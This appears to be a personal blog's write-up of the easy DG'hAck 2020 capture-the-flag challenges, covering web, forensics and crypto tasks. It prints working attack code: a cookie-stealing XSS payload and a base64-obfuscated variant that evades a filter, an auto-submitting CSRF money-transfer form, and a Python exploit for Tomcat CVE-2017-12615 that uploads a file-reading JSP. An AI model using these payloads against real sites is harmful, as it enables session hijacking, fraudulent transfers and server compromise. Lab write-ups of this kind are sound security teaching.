---
title: "DG'hAck: Easy Challenges"
date: 2020-11-30T19:45:41+01:00
tags:
  - dghack2020
summary: "Short write-up of the easiest DG'hAck challenges."
---

# Internal Support 1

Just a basic XSS. Grab the session cookies & you're basically done:

```javascript
<script>
window.onload = function() {
  var http = new XMLHttpRequest();
  var params = 'response=' + document.cookie + '&csrf_token=' + document.getElementById("csrf_token").value;
  console.log(params);

  http.open('POST', document.URL, true);
  http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  http.send(params);
}
</script>
```

You'll get the session cookie dumped, and you'll be able to get the flag by replacing your own cookie by the one dumped. As a result:

```sh
Hide the flag "NoUserValidationIsADangerousPractice" a little bit better
```

# Internal Support 2

The same than Internal Support 1, but with 2 restrictions:

 * You can't paste JS anymore;
 * There is some IP checks for sessions (You can't re-use a cookie from another IP).

As we can't re-use the cookie, we'll c/p paste the front page instead:

```javascript
var z=new XMLHttpRequest();
z.open('GET', '/', false);
z.send(null);
var t=document.createElement("div");
t.innerHTML = z.responseText;
z.open('POST',document.URL,true);
z.setRequestHeader('Content-type','application/x-www-form-urlencoded');
z.send('response='+btoa(t.textContent.replace(/\s\s+/g,' '))+'&csrf_token='+document.getElementById("csrf_token").value);
```

To bypass the javascript filter, I'll use the following html:

```html
<body onload="eval(atob('dmFyIHo9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7Cnoub3BlbignR0VUJywgJy8nLCBmYWxzZSk7Cnouc2VuZChudWxsKTsKdmFyIHQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnQuaW5uZXJIVE1MID0gei5yZXNwb25zZVRleHQ7Cnoub3BlbignUE9TVCcsZG9jdW1lbnQuVVJMLHRydWUpOwp6LnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtdHlwZScsJ2FwcGxpY2F0aW9uL3gtd
3d3LWZvcm0tdXJsZW5jb2RlZCcpOwp6LnNlbmQoJ3Jlc3BvbnNlPScrYnRvYSh0LnRleHRDb250ZW50LnJlcGxhY2UoL1xzXHMrL2csJyAnKSkrJyZjc3JmX3Rva2VuPScrZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNzcmZfdG9rZW4iKS52YWx1ZSk7Cg=='))">
```

And you'll get the flag:

```sh
Hide the flag "BEtter_BUT_ST!LL_N0tttttttttt++Prfct!" a little bit better
```

# UpCredit 

Another webapp. In it, a form to send money (but you don't get any), an a contact form. By studying the contact form, you can send a link to the advisor browser. You just need to send a form with some auto-submit (there is no CSRF protection):

```html
<html>
<head></head>
<body onload="javascript:document.forms[0].submit()">
<form method="POST" action="http://upcredit4.chall.malicecyber.com/transfer" id="form" name="form">
  <input type="hidden" id="account" name="account" value="9yDbRkzeg">
  <input type="hidden" id="amount" name="amount" value="1000">
  <button type="submit" id="reg-submit">Send</button>
</form>
</body>
</html>
```

You'll get 1000€, you can buy the flag: `W1nG4rD1um\L3v1os444!`.


# Server Room

In this one, you've got a somewhat big image file, called `found_in_server_room.img.gz`. No surprise, it is a disk dump:

```sh
# file found_in_server_room.img 
found_in_server_room.img: DOS/MBR boot sector; partition 1 : ID=0xc, start-CHS (0x40,0,1), end-CHS (0x3ff,3,32), startsector 8192, 524288 sectors; partition 2 : ID=0x83, start-CHS (0x3ff,3,32), end-CHS (0x3ff,3,32), startsector 532480, 3072000 sectors

# fdisk -l found_in_server_room.img 
Disk found_in_server_room.img: 1.72 GiB, 1845493248 bytes, 3604479 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x907af7d0

Device                    Boot  Start     End Sectors  Size Id Type
found_in_server_room.img1        8192  532479  524288  256M  c W95 FAT32 (LBA)
found_in_server_room.img2      532480 3604479 3072000  1.5G 83 Linux
```

Trying to mount it will fail:

```sh
# losetup -a /dev/loop0 found_in_server_room.img

# dmesg | tail -3
[269041.763511] blk_update_request: I/O error, dev loop0, sector 0 op 0x1:(WRITE) flags 0x800 phys_seg 0 prio class 0
[269041.763715] blk_update_request: I/O error, dev loop0, sector 0 op 0x1:(WRITE) flags 0x800 phys_seg 0 prio class 0
[269047.631585] EXT4-fs (loop0): bad geometry: block count 384000 exceeds size of device (383999 blocks)
```

Fixing it:

```sh
# ll found_in_server_room.img 
-rw-r--r--. 1 mycroft mycroft 1845493248 Nov 30 21:03 found_in_server_room.img

# truncate --size=$((1845493248 + 4096)) found_in_server_room.img 
# ll found_in_server_room.img 
-rw-r--r--. 1 mycroft mycroft 1845497344 Nov 30 21:05 found_in_server_room.img

# losetup -o $((532480 * 512)) loop0 found_in_server_room.img
# mount /dev/loop0 /mnt
# 
```

Once mounted, let's take a look at the logs. Nothing much interesting but:

```c
Aug 27 14:31:21 backpack systemd[1]: Started Update UTMP about System Runlevel Changes.
Aug 27 14:31:21 backpack systemd[1]: Startup finished in 3.262s (kernel) + 18.875s (userspace) = 22.138s.
Aug 27 14:31:24 backpack dhcpcd[563]: eth0: no IPv6 Routers available
Aug 27 14:31:26 backpack dhcpcd[563]: wlan0: using static address 192.168.100.1/24
Aug 27 14:31:26 backpack avahi-daemon[367]: Joining mDNS multicast group on interface wlan0.IPv4 with address 192.168.100.1.
Aug 27 14:31:26 backpack avahi-daemon[367]: New relevant interface wlan0.IPv4 for mDNS.
Aug 27 14:31:26 backpack avahi-daemon[367]: Registering new address record for 192.168.100.1 on wlan0.IPv4.
Aug 27 14:31:26 backpack dhcpcd[563]: wlan0: adding route to 192.168.100.0/24
Aug 27 14:31:35 backpack dhcpcd[563]: wlan0: no IPv6 Routers available
Aug 27 14:31:36 backpack systemd[1]: systemd-fsckd.service: Succeeded.
Aug 27 14:31:48 backpack systemd-timesyncd[305]: Synchronized to time server for the first time 212.83.158.83:123 (2.debian.pool.ntp.org).
Aug 27 14:31:53 backpack systemd[1]: systemd-hostnamed.service: Succeeded.
Aug 27 14:32:04 backpack hostapd: wlan0: STA 02:6c:0d:3b:04:17 IEEE 802.11: associated
Aug 27 14:32:04 backpack hostapd: wlan0: STA 02:6c:0d:3b:04:17 RADIUS: starting accounting session 1884F975E5BEC4AD
Aug 27 14:32:04 backpack hostapd: wlan0: STA 02:6c:0d:3b:04:17 WPA: pairwise key handshake completed (RSN)
```

On start, the system will launch the `hostapd` daemon, to create an AP. Let's take a look at its configuration:

```sh
# cat etc/hostapd/hostapd.conf 
country_code=FR
interface=wlan0
ssid=BackpackNet
hw_mode=g
channel=11
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=BackpackBackdoorNet
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
```

And we got our flag: `BackpackBackdoorNet`.

# Walter's blog

This new website is different from first websites. Searching for hidden page will render a 404 page, and we will get the server's version: `Apache Tomcat/9.0.0.M1`. A quick CVE search will bring up to attention the `CVE-2017-12615` which allow uploading .jsp files. Let's give it a try:

```python
#!/usr/bin/env python

import requests

url = 'http://waltersblog3.chall.malicecyber.com/aaaa.jsp'

content = """<%@ page import="java.io.*"%>
<%
FileInputStream in;
byte[] data = new byte[1024];

try {
  BufferedReader br = new BufferedReader(new FileReader("/flag.txt"));
  String st;

  while ((st = br.readLine()) != null) {
    out.println(st);
  }

} catch (IOException e){
  out.println("unable to open file");
}

%>"""

req = requests.put(url + '/', data=content)
print(req.status_code)

req = requests.get(url)
print(req.text)
```

This will ... output the flag: `flag{i4lW4y5UpD4T3Y0urt0mC@}`.


# Involucrypt 1

For the last easy challenge, we're facing some cryptography. We have 2 files: A python script used to encrypt, and an encrypted file. The encrypted file is just 370 bytes.

By reading the python script, we quickly find that it is encrypting 150 bytes blocks using a single char of the key for each block.

```python
... snip ...

BLOCK = 150

... snip ...


def keystream(seeds, length, base=None):
    key = base if base else []
    for seed in seeds:
        random = mersenne_rng(seed)

        for _ in range(BLOCK):
            if len(key) == length:
                break
            key.append(random.get_rand_int(0, 255))
            random.shuffle(key)
        if len(key) == length:
            break
    return key
```

Based on this only observation, we can quickly conclude that the encryption key is only 3 letters... and it will take a few seconds with pypy to bruteforce it. Password is `ane`, and the flag:

```sh
$ cat involucrypt1 | pypy crypt.py ane
The flag is: TheKeyIsTooDamnWeak!

Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor
incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud
exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure
dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.
```

# What did I learn ?

That Tomcat vulnerability was fun! I loved the realism of the challenges. I'll be honest: That was my first XSS ever as well.
